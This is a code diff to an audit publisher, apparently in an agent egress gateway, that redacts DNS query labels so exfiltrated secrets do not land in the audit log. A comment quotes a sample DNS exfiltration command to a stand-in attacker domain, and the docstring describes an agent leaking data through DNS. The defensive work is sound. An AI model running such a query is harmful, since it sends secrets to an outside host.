@@ -225,7 +225,20 @@ class AuditPublisher:
         # Short summary — matches the pattern in
         # safety/audit.py::summarize_context. Keeps the safety_decisions
         # row human-scannable without storing the full target.
-        summary = f"{request.mode}:{request.host}:{request.port}"
+        #
+        # DNS mode redacts labels past the registered-domain heuristic:
+        # a classic exfil attempt ``dig $SECRET_TOKEN.attacker.com``
+        # would otherwise write ``dns:$SECRET_TOKEN.attacker.com:0``
+        # into ``safety_decisions.context_summary``, leaking the
+        # payload to anyone with read access on that table.
+        # ``context_digest`` above keeps the SHA-256 so dedup of
+        # repeated queries still works.
+        display_host = (
+            _redact_dns_qname(request.host)
+            if request.mode == "dns"
+            else request.host
+        )
+        summary = f"{request.mode}:{display_host}:{request.port}"
         if request.qtype:
             summary = f"{summary} qtype={request.qtype}"
 
@@ -254,6 +267,27 @@ class AuditPublisher:
                 subject=subject,
                 error=str(exc),
             )
+
+
+def _redact_dns_qname(qname: str) -> str:
+    """Keep the last two labels, redact everything to their left.
+
+    Egress-design threat: an agent sends a DNS query whose leftmost
+    labels are the thing the attacker wants to exfiltrate. Dropping
+    everything past the public-suffix heuristic keeps the audit row
+    useful ("some query under attacker.com") without recording the
+    secret. The two-label heuristic is a deliberate simplification —
+    proper Public Suffix List handling lives in V2's secret scanner
+    (not in the gateway image's runtime surface).
+
+    Trailing dot tolerated; empty / single-label names pass through
+    unchanged (no room to redact).
+    """
+    cleaned = qname.rstrip(".")
+    parts = cleaned.split(".")
+    if len(parts) <= 2:
+        return cleaned
+    return "***." + ".".join(parts[-2:])
 
 
 def _finalize_findings(
